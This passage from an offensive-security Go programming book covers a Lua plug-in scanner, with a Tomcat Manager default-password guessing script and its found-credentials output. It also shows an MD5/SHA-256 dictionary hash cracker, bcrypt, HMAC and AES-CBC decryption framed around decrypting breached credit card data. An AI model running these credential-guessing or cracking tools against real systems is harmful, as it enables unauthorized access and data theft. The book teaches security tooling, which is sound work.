valid.\nThe function proceeds to issue an HTTP HEAD request\nand perform some error checking. In order to return values to\nyour Lua callers, you push the values onto your lua.LState by\ncalling l.Push() and passing it an object that fulfills the lua.LValue\ninterface type ❸. The gopher-lua package contains several types\nthat implement this interface, making it as easy as calling\nlua.LNumber(0) and lua.LBool(false), for example, to create numerical\nand boolean return types.\nIn this example, you’re returning three values. The first is\nthe HTTP status code, the second determines whether the\nserver requires basic authentication, and the third is an error\nmessage. We’ve chosen to set the status code to 0 if an error\noccurs. You then return 3, which is the number of items you’ve\npushed onto your LState instance ❹. If your call to http.Head()\ndoesn’t produce an error, you push your return values onto\nLState ❺, this time with a valid status code, and then check for\nbasic authentication and return 3 ❻.\nCreating the get() Function\nNext, you’ll create your get() function, which, like the previous\nexample, wraps the net/http package’s functionality. In this case,\nhowever, you’ll issue an HTTP GET request. Other than that,\nthe get() function uses fairly similar constructs as your head()\nfunction by issuing an HTTP request to your target endpoint.\nEnter the code in Listing 10-5.\nfunc get(l *lua.LState) int {\nvar (\nhost string\nport uint64\nusername string\npassword string\npath string\nresp *http.Response\nerr error\nurl string\nclient *http.Client\nreq *http.Request\n)\nhost = l.CheckString(1)\nport = uint64(l.CheckInt64(2))\n❶ username = l.CheckString(3)\npassword = l.CheckString(4)\npath = l.CheckString(5)\nurl = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\nclient = new(http.Client)\nif req, err = http.NewRequest(\"GET\", url, nil); err != nil {\nl.Push(lua.LNumber(0))\nl.Push(lua.LBool(false))\nl.Push(lua.LString(fmt.Sprintf(\"Unable to build GET request: %s\", err)))\nreturn 3\n}\nif username != \"\" || password != \"\" {\n// Assume Basic Auth is required since user and/or password is set\nreq.SetBasicAuth(username, password)\n}\nif resp, err = client.Do(req); err != nil {\nl.Push(lua.LNumber(0))\nl.Push(lua.LBool(false))\nl.Push(lua.LString(fmt.Sprintf(\"Unable to send GET request: %s\", err)))\nreturn 3\n}\nl.Push(lua.LNumber(resp.StatusCode))\nl.Push(lua.LBool(false))\nl.Push(lua.LString(\"\"))\nreturn 3\n}\nListing 10-5: Creating a get() function for Lua (/ch-10/lua-\ncore/cmd/scanner/main.go)\nMuch like your head() implementation, your get() function\nwill return three values: the status code, a value expressing\nwhether the system you’re trying to access requires basic\nauthentication, and any error messages. The only real\ndifference between the two functions is that your get() function\naccepts two additional string parameters: a username and a\npassword ❶. If either of these values is set to a non-empty\nstring, you’ll assume you have to perform basic authentication.\nNow, some of you are probably thinking that the\nimplementations are oddly specific, almost to the point of\nnegating any flexibility, reusability, and portability of a plug-\nin system. It’s almost as if these functions were designed for a\nvery specific use case—that is, to check for basic\nauthentication—rather than for a general purpose. After all,\nwhy wouldn’t you return the response body or the HTTP\nheaders? Likewise, why wouldn’t you accept more robust\nparameters to set cookies, other HTTP headers, or issue POST\nrequests with a body, for example?\nSimplicity is the answer. Your implementations can act as a\nstarting point for building a more robust solution. However,\ncreating that solution would be a more significant endeavor,\nand you’d likely lose the code’s purpose while trying to\nnavigate implementation details. Instead, we’ve chosen to do\nthings in a more basic, less flexible fashion to make the\ngeneral, foundational concepts simpler to understand. An\nimproved implementation would likely expose complex user-\ndefined types that better represent the entirety of, for example,\nthe http.Request and http.Response types. Then, rather than accepting\nand returning multiple parameters from Lua, you could\nsimplify your function signatures, reducing the number of\nparameters you accept and return. We encourage you to work\nthrough this challenge as an exercise, changing the code to\naccept and return user-defined structs rather than primitive\ntypes.\nRegistering the Functions with the Lua VM\nUp to this point, you’ve implemented wrapper functions\naround the necessary net/http calls you intend to use, creating\nthe functions so gopher-lua can consume them. However, you\nneed to actually register the functions with the Lua VM. The\nfunction in Listing 10-6 centralizes this registration process.\n❶ const LuaHttpTypeName = \"http\"\nfunc register(l *lua.LState) {\n❷ mt := l.NewTypeMetatable(LuaHttpTypeName)\n❸ l.SetGlobal(\"http\", mt)\n// static attributes\n❹ l.SetField(mt, \"head\", l.NewFunction(head))\nl.SetField(mt, \"get\", l.NewFunction(get))\n}\nListing 10-6: Registering plug-ins with Lua (/ch-10/lua-core/cmd/scanner/main.go)\nYou start by defining a constant that will uniquely identify\nthe namespace you’re creating in Lua ❶. In this case, you’ll\nuse http because that’s essentially the functionality you’re\nexposing. In your register() function, you accept a pointer to a\nlua.LState, and use that namespace constant to create a new Lua\ntype via a call to l.NewTypeMetatable() ❷. You’ll use this\nmetatable to track types and functions available to Lua.\nYou then register a global name, http, on the metatable ❸.\nThis makes the http implicit package name available to the Lua\nVM. On the same metatable, you also register two fields by\nusing calls to l.SetField() ❹. Here, you define two static\nfunctions named head() and get(), available on the http\nnamespace. Since they’re static, you can call them via http.get()\nand http.head() without having to create an instance of type http in\nLua.\nAs you may have noted in the SetField() calls, the third\nparameter is the destination function that’ll handle the Lua\ncalls. In this case, those are your get() and head() functions you\npreviously implemented. These are wrapped in a call to\nl.NewFunction(), which accepts a function of form func(*LState) int,\nwhich is how you defined your get() and head() functions. They\nreturn a *lua.LFunction. This might be a little overwhelming,\nsince we’ve introduced a lot of data types and you’re probably\nunfamiliar with gopher-lua. Just understand that this function is\nregistering the global namespace and function names and\ncreating mappings between those function names and your Go\nfunctions.\nWriting Your Main Function\nLastly, you’ll need to create your main() function, which will\ncoordinate this registration process and execute the plug-in\n(Listing 10-7).\n❶ const PluginsDir = \"../../plugins\"\nfunc main() {\nvar (\nl *lua.LState\nfiles []os.FileInfo\nerr error\nf string\n)\n❷ l = lua.NewState()\ndefer l.Close()\n❸ register(l)\n❹ if files, err = ioutil.ReadDir(PluginsDir); err != nil {\nlog.Fatalln(err)\n}\n❺ for idx := range files {\nfmt.Println(\"Found plugin: \" + files[idx].Name())\nf = fmt.Sprintf(\"%s/%s\", PluginsDir, files[idx].Name())\n❻ if err := l.DoFile(f); err != nil {\nlog.Fatalln(err)\n}\n}\n}\nListing 10-7: Registering and calling Lua plug-ins (/ch-10/lua-\ncore/cmd/scanner/main.go)\nAs you did for your main() function in the Go example,\nyou’ll hardcode the directory location from which you’ll load\nyour plug-ins ❶. In your main() function, you issue a call to\nlua.NewState() ❷ to create a new *lua.LState instance. The\nlua.NewState() instance is the key item you’ll need to set up your\nLua VM, register your functions and types, and execute\narbitrary Lua scripts. You then pass that pointer to the register()\nfunction you created earlier ❸, which registers your custom\nhttp namespace and functions on the state. You read the\ncontents of your plug-ins directory ❹, looping through each\nHivaNetwork.Com\nfile in the directory ❺. For each file, you call l.DoFile(f) ❻,\nwhere f is the absolute path to the file. This call executes the\ncontents of the file within the Lua state on which you\nregistered your custom types and functions. Basically, DoFile()\nis gopher-lua’s way of allowing you to execute entire files as if\nthey were stand-alone Lua scripts.\nCreating Your Plug-in Script\nNow let’s take a look at your Tomcat plug-in script, written in\nLua (Listing 10-8).\nusernames = {\"admin\", \"manager\", \"tomcat\"}\npasswords = {\"admin\", \"manager\", \"tomcat\", \"password\"}\nstatus, basic, err = http.head(\"10.0.1.20\", 8080, \"/manager/html\") ❶\nif err ~= \"\" then\nprint(\"[!] Error: \"..err)\nreturn\nend\nif status ~= 401 or not basic then\nprint(\"[!] Error: Endpoint does not require Basic Auth. Exiting.\")\nreturn\nend\nprint(\"[+] Endpoint requires Basic Auth. Proceeding with password guessing\")\nfor i, username in ipairs(usernames) do\nfor j, password in ipairs(passwords) do\nstatus, basic, err = http.get(\"10.0.1.20\", 8080, username, password,\n\"/manager/html\") ❷\nif status == 200 then\nprint(\"[+] Found creds - \"..username..\":\"..password)\nreturn\nend\nend\nend\nListing 10-8: A Lua plug-in for Tomcat password guessing (/ch-10/lua-\ncore/plugins/tomcat.lua)\nDon’t worry too much about the vulnerability-checking\nlogic. It’s essentially the same as the logic you created in the\nGo version of this plug-in; it performs basic password\nguessing against the Tomcat Manager portal after it\nfingerprints the application by using a HEAD request. We’ve\nhighlighted the two most interesting items.\nThe first is a call to http.head(\"10.0.1.20\", 8080, \"/manager/html\") ❶.\nBased off your global and field registrations on the state\nmetatable, you can issue a call to a function named http.head()\nwithout receiving a Lua error. Additionally, you’re supplying\nthe call with the three parameters your head() function expected\nto read from the LState instance. The Lua call is expecting three\nreturn values, which align with the numbers and types you\npushed onto the LState before you exited the Go function.\nThe second item is your call to http.get() ❷, which is similar\nto the http.head() function call. The only real difference is that\nyou are passing username and password parameters to the\nhttp.get() function. If you refer back to the Go implementation of\nyour get() function, you’ll see that we’re reading these two\nadditional strings from the LState instance.\nTesting the Lua Plug-in\nThis example isn’t perfect and could benefit from additional\ndesign considerations. But as with most adversarial tools, the\nmost important thing is that it works and solves a problem.\nRunning your code proves that it does, indeed, work as\nexpected:\n$ go run main.go\nFound plugin: tomcat.lua\n[+] Endpoint requires Basic Auth. Proceeding with password guessing"
  },
  {
    "input": "Summary",
    "output": "[+] Found creds - tomcat:tomcat\nNow that you have a basic working example, we encourage\nyou to improve the design by implementing user-defined types\nso that you aren’t passing lengthy lists of arguments and\nparameters to and from functions. With this, you’ll likely need\nto explore registering instance methods on your struct, whether\nfor setting and getting values in Lua or for calling methods on\na specifically implemented instance. As you work through\nthis, you’ll notice that your code will get significantly more\ncomplex, since you’ll be wrapping a lot of your Go\nfunctionality in a Lua-friendly manner.\nSUMMARY\nAs with many design decisions, there are multiple ways to skin\na cat. Whether you’re using Go’s native plug-in system or an\nalternative language like Lua, you must consider trade-offs.\nBut regardless of your approach, you can easily extend Go to\nmake rich security frameworks, particularly since the addition\nof its native plug-in system.\nIn the next chapter, you’ll tackle the rich topic of\ncryptography. We’ll demonstrate various implementations and\nuse cases, and then build an RC2 symmetric-key brute-forcer."
  },
  {
    "input": "11 IMPLEMENTING AND ATTACKING CRYPTOGRAPHY",
    "output": "11\nIMPLEMENTING AND ATTACKING\nCRYPTOGRAPHY\nA conversation about security isn’t complete without\nexploring cryptography. When organizations use\ncryptographic practices, they can help conserve the integrity,\nconfidentiality, and authenticity of their information and\nsystems alike. As a tool developer, you’d likely need to\nimplement cryptographic features, perhaps for SSL/TLS\ncommunications, mutual authentication, symmetric-key\ncryptography, or password hashing. But developers often\nimplement cryptographic functions insecurely, which means\nthe offensive-minded can exploit these weaknesses to\ncompromise sensitive, valuable data, such as social security or\ncredit card numbers.\nThis chapter demonstrates various implementations of\ncryptography in Go and discusses common weaknesses you\ncan exploit. Although we provide introductory information for\nthe different cryptographic functions and code blocks, we’re\nnot attempting to explore the nuances of cryptographic"
  },
  {
    "input": "Reviewing Basic Cryptography Concepts",
    "output": "algorithms or their mathematical foundations. That, frankly, is\nfar beyond our interest in (or knowledge of) cryptography. As\nwe’ve stated before, don’t attempt anything in this chapter\nagainst resources or assets without explicit permission from\nthe owner. We’re including these discussions for learning\npurposes, not to assist in illegal activities.\nREVIEWING BASIC\nCRYPTOGRAPHY CONCEPTS\nBefore we explore crypto in Go, let’s discuss a few basic\ncryptography concepts. We’ll make this short to keep you\nfrom falling into a deep sleep.\nFirst, encryption (for the purposes of maintaining\nconfidentiality) is just one of the tasks of cryptography.\nEncryption, generally speaking, is a two-way function with\nwhich you can scramble data and subsequently unscramble it\nto retrieve the initial input. The process of encrypting data\nrenders it meaningless until it’s been decrypted.\nBoth encryption and decryption involve passing the data\nand an accompanying key into a cryptographic function. The\nfunction outputs either the encrypted data (called ciphertext)\nor the original, readable data (called cleartext). Various\nalgorithms exist to do this. Symmetric algorithms use the same\nkey during the encryption and decryption processes, whereas\nasymmetric algorithms use different keys for encryption and\ndecryption. You might use encryption to protect data in transit\nor to store sensitive information, such as credit card numbers,\nto decrypt later, perhaps for convenience during a future\npurchase or for fraud monitoring.\nOn the other hand, hashing is a one-way process for\nmathematically scrambling data. You can pass sensitive\ninformation into a hashing function to produce a fixed-length\noutput. When you’re working with strong algorithms, such as\nthose in the SHA-2 family, the probability that different inputs\nproduce the same output is extremely low. That is, there is a\nlow likelihood of a collision. Because they’re nonreversible,\nhashes are commonly used as an alternative to storing cleartext\npasswords in a database or to perform integrity checking to\ndetermine whether data has been changed. If you need to\nobscure or randomize the outputs for two identical inputs, you\nuse a salt, which is a random value used to differentiate two\nidentical inputs during the hashing process. Salts are common\nfor password storage because they allow multiple users who\ncoincidentally use identical passwords to still have different\nhash values.\nCryptography also provides a means for authenticating\nmessages. A message authentication code (MAC) is the output\nproduced from a special one-way cryptographic function. This\nfunction consumes the data itself, a secret key, and an\ninitialization vector, and produces an output unlikely to have a\ncollision. The sender of a message performs the function to\ngenerate a MAC and then includes the MAC as part of the\nmessage. The receiver locally calculates the MAC and\ncompares it to the MAC they received. A match indicates that\nthe sender has the correct secret key (that is, that the sender is\nauthentic) and that the message was not changed (the integrity\nhas been maintained).\nThere! Now you should know enough about cryptography\nto understand the contents of this chapter. Where necessary,"
  },
  {
    "input": "Understanding the Standard Crypto Library",
    "output": "we’ll discuss more specifics relevant to the given topic. Let’s\nstart by looking at Go’s standard crypto library.\nUNDERSTANDING THE STANDARD\nCRYPTO LIBRARY\nThe beautiful thing about implementing crypto in Go is that\nthe majority of cryptographic features you’ll likely use are part\nof the standard library. Whereas other languages commonly\nrely on OpenSSL or other third-party libraries, Go’s crypto\nfeatures are part of the official repositories. This makes\nimplementing crypto relatively straightforward, as you won’t\nhave to install clumsy dependencies that’ll pollute your\ndevelopment environment. There are two separate repositories.\nThe self-contained crypto package contains a variety of\nsubpackages used for the most common cryptographic tasks\nand algorithms. For example, you could use the aes, des, and rc4\nsubpackages for implementing symmetric-key algorithms; the\ndsa and rsa subpackages for asymmetric encryption; and the md5,\nsha1, sha256, and sha512 subpackages for hashing. This is not an\nexhaustive list; additional subpackages exist for other crypto\nfunctions, as well.\nIn addition to the standard crypto package, Go has an\nofficial, extended package that contains a variety of\nsupplementary crypto functionality: golang.org/x/crypto. The\nfunctionality within includes additional hashing algorithms,\nencryption ciphers, and utilities. For example, the package\ncontains a bcrypt subpackage for bcrypt hashing (a better, more\nsecure alternative for hashing passwords and sensitive data),\nacme/autocert for generating legitimate certificates, and SSH"
  },
  {
    "input": "Exploring Hashing",
    "output": "subpackages to facilitate communications over the SSH\nprotocol.\nThe only real difference between the built-in crypto and\nsupplementary golang.org/x/crypto packages is that the crypto\npackage adheres to more stringent compatibility requirements.\nAlso, if you wish to use any of the golang.org/x/crypto\nsubpackages, you’ll first need to install the package by\nentering the following:\n$ go get -u golang.org/x/crypto/bcrypt\nFor a complete listing of all the functionality and\nsubpackages within the official Go crypto packages, check out\nthe official documentation at https://golang.org/pkg/crypto/\nand https://godoc.org/golang.org/x/crypto/.\nThe next sections delve into various crypto\nimplementations. You’ll see how to use Go’s crypto\nfunctionality to do some nefarious things, such as crack\npassword hashes, decrypt sensitive data by using a static key,\nand brute-force weak encryption ciphers. You’ll also use the\nfunctionality to create tools that use TLS to protect your in-\ntransit communications, check the integrity and authenticity of\ndata, and perform mutual authentication.\nEXPLORING HASHING\nHashing, as we mentioned previously, is a one-way function\nused to produce a fixed-length, probabilistically unique output\nbased on a variable-length input. You can’t reverse this hash\nvalue to retrieve the original input source. Hashes are often\nused to store information whose original, cleartext source\nwon’t be needed for future processing or to track the integrity\nof data. For example, it’s bad practice and generally\nunnecessary to store the cleartext version of the password;\ninstead, you’d store the hash (salted, ideally, to ensure\nrandomness between duplicate values).\nTo demonstrate hashing in Go, we’ll look at two examples.\nThe first attempts to crack a given MD5 or SHA-512 hash by\nusing an offline dictionary attack. The second example\ndemonstrates an implementation of bcrypt. As mentioned\npreviously, bcrypt is a more secure algorithm for hashing\nsensitive data such as passwords. The algorithm also contains\na feature that reduces its speed, making it harder to crack\npasswords.\nCracking an MD5 or SHA-256 Hash\nListing 11-1 shows the hash-cracking code. (All the code\nlistings at the root location of / exist under the provided github\nrepo https://github.com/blackhat-go/bhg/.) Since hashes aren’t\ndirectly reversible, the code instead tries to guess the cleartext\nvalue of the hash by generating its own hashes of common\nwords, taken from a word list, and then comparing the\nresulting hash value with the hash you have in hand. If the two\nhashes match, you’ve likely guessed the cleartext value.\n❶ var md5hash = \"77f62e3524cd583d698d51fa24fdff4f\"\nvar sha256hash =\n\"95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced\"\nfunc main() {\nf, err := os.Open(\"wordlist.txt\")❷\nif err != nil {\nlog.Fatalln(err)\n}\ndefer f.Close()\n❸ scanner := bufio.NewScanner(f)\nfor scanner.Scan() {\npassword := scanner.Text()\nhash := fmt.Sprintf(\"%x\", md5.Sum([]byte(password))❹)\n❺ if hash == md5hash {\nfmt.Printf(\"[+] Password found (MD5): %s\\n\", password)\n}\nhash = fmt.Sprintf(\"%x\", sha256.Sum256([]byte(password))❻)\n❼ if hash == sha256hash {\nfmt.Printf(\"[+] Password found (SHA-256): %s\\n\", password)\n}\n}\nif err := scanner.Err(); err != nil {\nlog.Fatalln(err)\n}\n}\nListing 11-1: Cracking MD5 and SHA-256 hashes (/ch-11/hashes/main.go)\nYou start by defining two variables ❶ that hold the target\nhash values. One is an MD5 hash, and the other is a SHA-256.\nImagine that you acquired these two hashes as part of post-\nexploitation and you’re trying to determine the inputs (the\ncleartext passwords) that produced them after being run\nthrough the hashing algorithm. You can often determine the\nalgorithm by inspecting the length of the hash itself. When you\nfind a hash that matches the target, you’ll know you have the\ncorrect input.\nThe list of inputs you’ll try exists in a dictionary file you’ll\nhave created earlier. Alternatively, a Google search can help\nyou find dictionary files for commonly used passwords. To\ncheck the MD5 hash, you open the dictionary file ❷ and read\nHivaNetwork.Com\nit, line by line, by creating a bufio.Scanner on the file descriptor\n❸. Each line consists of a single password value that you wish\nto check. You pass the current password value into a function\nnamed md5.Sum(input []byte) ❹. This function produces the MD5\nhash value as raw bytes, so you use the fmt.Sprintf() function\nwith the format string %x to convert it to a hexadecimal string.\nAfter all, your md5hash variable consists of a hexadecimal string\nrepresentation of the target hash. Converting your value\nensures that you can then compare the target and calculated\nhash values ❺. If these hashes match, the program displays a\nsuccess message to stdout.\nYou perform a similar process to calculate and compare\nSHA-256 hashes. The implementation is fairly similar to the\nMD5 code. The only real difference is that the sha256 package\ncontains additional functions to calculate various SHA hash\nlengths. Rather than calling sha256.Sum() (a function that doesn’t\nexist), you instead call sha256.Sum256(input []byte) ❻ to force the\nhash to be calculated using the SHA-256 algorithm. Much as\nyou did in the MD5 example, you convert your raw bytes to a\nhex string and compare the SHA-256 hashes to see whether\nyou have a match ❼.\nImplementing bcrypt\nThe next example shows how to use bcrypt to encrypt and\nauthenticate passwords. Unlike SHA and MD5, bcrypt was\ndesigned for password hashing, making it a better option for\napplication designers than the SHA or MD5 families. It\nincludes a salt by default, as well as a cost factor that makes\nrunning the algorithm more resource-intensive. This cost\nfactor controls the number of iterations of the internal crypto\nfunctions, increasing the time and effort needed to crack a\npassword hash. Although the password can still be cracked\nusing a dictionary or brute-force attack, the cost (in time)\nincreases significantly, discouraging cracking activities during\ntime-sensitive post-exploitation. It’s also possible to increase\nthe cost over time to counter the advancement of computing\npower. This makes it adaptive to future cracking attacks.\nListing 11-2 creates a bcrypt hash and then validates\nwhether a cleartext password matches a given bcrypt hash.\nimport (\n\"log\"\n\"os\"\n❶ \"golang.org/x/crypto/bcrypt\"\n)\n❷ var storedHash =\n\"$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu\"\nfunc main() {\nvar password string\nif len(os.Args) != 2 {\nlog.Fatalln(\"Usage: bcrypt password\")\n}\npassword = os.Args[1]\n❸ hash, err := bcrypt.GenerateFromPassword(\n[]byte(password),\nbcrypt.DefaultCost,\n)\nif err != nil {\nlog.Fatalln(err)\n}\nlog.Printf(\"hash = %s\\n\", hash)\n❹ err = bcrypt.CompareHashAndPassword([]byte(storedHash),\n[]byte(password))\nif err != nil {\nlog.Println(\"[!] Authentication failed\")\nreturn\n}\nlog.Println(\"[+] Authentication successful\")\n}\nListing 11-2: Comparing bcrypt hashes (/ch-11/bcrypt/main.go)\nFor most of the code samples in this book, we’ve omitted\nthe package imports. We’ve included them in this example to\nexplicitly show that you’re using the supplemental Go\npackage, golang.org/x/crypto/bcrypt ❶, because Go’s built-in crypto\npackage doesn’t contain the bcrypt functionality. You then\ninitialize a variable, storedHash ❷, that holds a precomputed,\nencoded bcrypt hash. This is a contrived example; rather than\nwiring our sample code up to a database to get a value, we’ve\nopted to hardcode a value for demonstrative purposes. The\nvariable could represent a value that you’ve found in a\ndatabase row that stores user authentication information for a\nfrontend web application, for instance.\nNext, you’ll produce a bcrypt-encoded hash from a\ncleartext password value. The main function reads a password\nvalue as a command line argument and proceeds to call two\nseparate bcrypt functions. The first function,\nbcrypt.GenerateFromPassword() ❸, accepts two parameters: a byte\nslice representing the cleartext password and a cost value. In\nthis example, you’ll pass the constant variable bcrypt.DefaultCost\nto use the package’s default cost, which is 10 at the time of\nthis writing. The function returns the encoded hash value and\nany errors produced.\nThe second bcrypt function you call is\nbcrypt.CompareHashAndPassword() ❹, which does the hash\ncomparison for you behind the scenes. It accepts a bcrypt-\nencoded hash and a cleartext password as byte slices. The\nfunction parses the encoded hash to determine the cost and\nsalt. It then uses these values with the cleartext password value\nto generate a bcrypt hash. If this resulting hash matches the\nhash extracted from the encoded storedHash value, you know the\nprovided password matches what was used to create the\nstoredHash.\nThis is the same method you used to perform your\npassword cracking against SHA and MD5—run a given\npassword through the hashing function and compare the result\nwith the stored hash. Here, rather than explicitly comparing\nthe resulting hashes as you did for SHA and MD5, you check\nwhether bcrypt.CompareHashAndPassword() returns an error. If you\nsee an error, you know the computed hashes, and therefore the\npasswords used to compute them, do not match.\nThe following are two sample program runs. The first\nshows the output for an incorrect password:\n$ go run main.go someWrongPassword\n2020/08/25 08:44:01 hash =\n$2a$10$YSSanGl8ye/NC7GDyLBLUO5gE/ng51l9TnaB1zTChWq5g9i09v0AC\n2020/08/25 08:44:01 [!] Authentication failed\nThe second shows the output for the correct password:\n$ go run main.go someC0mpl3xP@ssw0rd\n2020/08/25 08:39:29 hash =\n$2a$10$XfeUk.wKeEePNAfjQ1juXe8RaM/9EC1XZmqaJ8MoJB29hZRyuNxz.\n2020/08/25 08:39:29 [+] Authentication successful\nThose of you with a keen eye for detail may notice that the"
  },
  {
    "input": "Authenticating Messages",
    "output": "hash value displayed for your successful authentication does\nnot match the value you hardcoded for your storedHash variable.\nRecall, if you will, that your code is calling two separate\nfunctions. The GenerateFromPassword() function produces the\nencoded hash by using a random salt value. Given different\nsalts, the same password will produce different resulting\nhashes. Hence the difference. The CompareHashAndPassword()\nfunction performs the hashing algorithm by using the same salt\nand cost as the stored hash, so the resulting hash is identical to\nthe one in the storedHash variable.\nAUTHENTICATING MESSAGES\nLet’s now turn our focus to message authentication. When\nexchanging messages, you need to validate both the integrity\nof data and the authenticity of the remote service to make sure\nthat the data is authentic and hasn’t been tampered with. Was\nthe message altered during transmission by an unauthorized\nsource? Was the message sent by an authorized sender or was\nit forged by another entity?\nYou can address these questions by using Go’s crypto/hmac\npackage, which implements the Keyed-Hash Message\nAuthentication Code (HMAC) standard. HMAC is a\ncryptographic algorithm that allows us to check for message\ntampering and verify the identity of the source. It uses a\nhashing function and consumes a shared secret key, which\nonly the parties authorized to produce valid messages or data\nshould possess. An attacker who does not possess this shared\nsecret cannot reasonably forge a valid HMAC value.\nImplementing HMAC in some programming languages can\nbe a little tricky. For example, some languages force you to\nmanually compare the received and calculated hash values\nbyte by byte. Developers may inadvertently introduce timing\ndiscrepancies in this process if their byte-by-byte comparison\nis aborted prematurely; an attacker can deduce the expected\nHMAC by measuring message-processing times. Additionally,\ndevelopers will occasionally think HMACs (which consume a\nmessage and key) are the same as a hash of a secret key\nprepended to a message. However, the internal functionality of\nHMACs differs from that of a pure hashing function. By not\nexplicitly using an HMAC, the developer is exposing the\napplication to length-extension attacks, in which an attacker\nforges a message and valid MAC.\nLuckily for us Gophers, the crypto/hmac package makes it\nfairly easy to implement HMAC functionality in a secure\nfashion. Let’s look at an implementation. Note that the\nfollowing program is much simpler than a typical use case,\nwhich would likely involve some type of network\ncommunications and messaging. In most cases, you’d\ncalculate the HMAC on HTTP request parameters or some\nother message transmitted over a network. In the example\nshown in Listing 11-3, we’re omitting the client-server\ncommunications and focusing solely on the HMAC\nfunctionality.\nvar key = []byte(\"some random key\") ❶\nfunc checkMAC(message, recvMAC []byte) bool { ❷\nmac := hmac.New(sha256.New, key) ❸\nmac.Write(message)\ncalcMAC := mac.Sum(nil)\nreturn hmac.Equal(calcMAC, recvMAC)❹\n}\nfunc main() {\n// In real implementations, we'd read the message and HMAC value from\nnetwork source\nmessage := []byte(\"The red eagle flies at 10:00\") ❺\nmac, _ :=\nhex.DecodeString(\"69d2c7b6fbbfcaeb72a3172f4662601d1f16acfb46339639ac8c10c8da64631d\")\n❻\nif checkMAC(message, mac) { ❼\nfmt.Println(\"EQUAL\")\n} else {\nfmt.Println(\"NOT EQUAL\")\n}\n}\nListing 11-3: Using HMAC for message authentication (/ch-11/hmac/main.go)\nThe program begins by defining the key you’ll use for your\nHMAC cryptographic function ❶. You’re hardcoding the\nvalue here, but in a real implementation, this key would be\nadequately protected and random. It would also be shared\nbetween the endpoints, meaning both the message sender and\nreceiver are using this same key value. Since you aren’t\nimplementing full client-server functionality here, you’ll use\nthis variable as if it were adequately shared.\nNext, you define a function, checkMAC() ❷, that accepts a\nmessage and the received HMAC as parameters. The message\nreceiver would call this function to check whether the MAC\nvalue they received matches the value they calculated locally.\nFirst, you call hmac.New() ❸, passing to it sha256.New, which is a\nfunction that returns a hash.Hash instance, and the shared secret\nkey. In this case, the hmac.New() function initializes your HMAC\nby using the SHA-256 algorithm and your secret key, and\nassigns the result to a variable named mac. You then use this\nvariable to calculate the HMAC hash value, as you did in the\nearlier hashing examples. Here, you call mac.Write(message) and\nmac.Sum(nil), respectively. The result is your locally calculated\nHMAC, stored in a variable named calcMAC.\nThe next step is to evaluate whether your locally calculated\nHMAC value is equal to the HMAC value you received. To do\nthis in a secure manner, you call hmac.Equal(calcMAC, recvMAC) ❹.\nA lot of developers would be inclined to compare the byte\nslices by calling bytes.Compare(calcMAC, recvMAC). The problem is,\nbytes.Compare() performs a lexicographical comparison, walking\nand comparing each element of the given slices until it finds a\ndifference or reaches the end of a slice. The time it takes to\ncomplete this comparison will vary based on whether\nbytes.Compare() encounters a difference on the first element, the\nlast, or somewhere in between. An attacker could measure this\nvariation in time to determine the expected HMAC value and\nforge a request that’s processed legitimately. The hmac.Equal()\nfunction solves this problem by comparing the slices in a way\nthat produces nearly constant measurable times. It doesn’t\nmatter where the function finds a difference, because the\nprocessing times will vary insignificantly, producing no\nobvious or perceptible pattern.\nThe main() function simulates the process of receiving a\nmessage from a client. If you were really receiving a message,\nyou’d have to read and parse the HMAC and message values\nfrom the transmission. Since this is just a simulation, you\ninstead hardcode the received message ❺ and the received\nHMAC ❻, decoding the HMAC hex string so it’s represented\nas a []byte. You use an if statement to call your checkMAC()"
  },
  {
    "input": "Encrypting Data",
    "output": "function ❼, passing it your received message and HMAC. As\ndetailed previously, your checkMAC() function computes an\nHMAC by using the received message and the shared secret\nkey and returns a bool value for whether the received HMAC\nand calculated HMAC match.\nAlthough the HMAC does provide both authenticity and\nintegrity assurance, it doesn’t ensure confidentiality. You can’t\nknow for sure that the message itself wasn’t seen by\nunauthorized resources. The next section addresses this\nconcern by exploring and implementing various types of\nencryption.\nENCRYPTING DATA\nEncryption is likely the most well-known cryptographic\nconcept. After all, privacy and data protection have garnered\nsignificant news coverage due to high-profile data breaches,\noften resulting from organizations storing user passwords and\nother sensitive data in unencrypted formats. Even without the\nmedia attention, encryption should spark the interest of black\nhats and developers alike. After all, understanding the basic\nprocess and implementation can be the difference between a\nlucrative data breach and a frustrating disruption to an attack\nkill chain. The following section presents the varying forms of\nencryption, including useful applications and use cases for\neach.\nSymmetric-Key Encryption\nYour journey into encryption will start with what is arguably\nits most straightforward form—symmetric-key encryption. In\nthis form, both the encryption and decryption functions use the\nsame secret key. Go makes symmetric cryptography pretty\nstraightforward, because it supports most common algorithms\nin its default or extended packages.\nFor the sake of brevity, we’ll limit our discussion of\nsymmetric-key encryption to a single, practical example. Let’s\nimagine you’ve breached an organization. You’ve performed\nthe necessary privilege escalation, lateral movement, and\nnetwork recon to gain access to an e-commerce web server\nand the backend database. The database contains financial\ntransactions; however, the credit card number used in those\ntransactions is obviously encrypted. You inspect the\napplication source code on the web server and determine that\nthe organization is using the Advanced Encryption Standard\n(AES) encryption algorithm. AES supports multiple operating\nmodes, each with slightly different considerations and\nimplementation details. The modes are not interchangeable;\nthe mode used for decryption must be identical to that used for\nencryption.\nIn this scenario, let’s say you’ve determined that the\napplication is using AES in Cipher Block Chaining (CBC)\nmode. So, let’s write a function that decrypts these credit cards\n(Listing 11-4). Assume that the symmetric key was hardcoded\nin the application or set statically in a configuration file. As\nyou go through this example, keep in mind that you’ll need to\ntweak this implementation for other algorithms or ciphers, but\nit’s a good starting place.\nfunc unpad(buf []byte) []byte { ❶\n// Assume valid length and padding. Should add checks\npadding := int(buf[len(buf)-1])\nHivaNetwork.Com\nreturn buf[:len(buf)-padding]\n}\nfunc decrypt(ciphertext, key []byte) ([]byte, error) { ❷\nvar (\nplaintext []byte\niv []byte\nblock cipher.Block\nmode cipher.BlockMode\nerr error\n)\nif len(ciphertext) < aes.BlockSize { ❸\nreturn nil, errors.New(\"Invalid ciphertext length: too short\")\n}\nif len(ciphertext)%aes.BlockSize != 0 { ❹\nreturn nil, errors.New(\"Invalid ciphertext length: not a multiple of blocksize\")\n}\niv = ciphertext[:aes.BlockSize] ❺\nciphertext = ciphertext[aes.BlockSize:]\nif block, err = aes.NewCipher(key); err != nil { ❻\nreturn nil, err\n}\nmode = cipher.NewCBCDecrypter(block, iv) ❼\nplaintext = make([]byte, len(ciphertext))\nmode.CryptBlocks(plaintext, ciphertext) ❽\nplaintext = 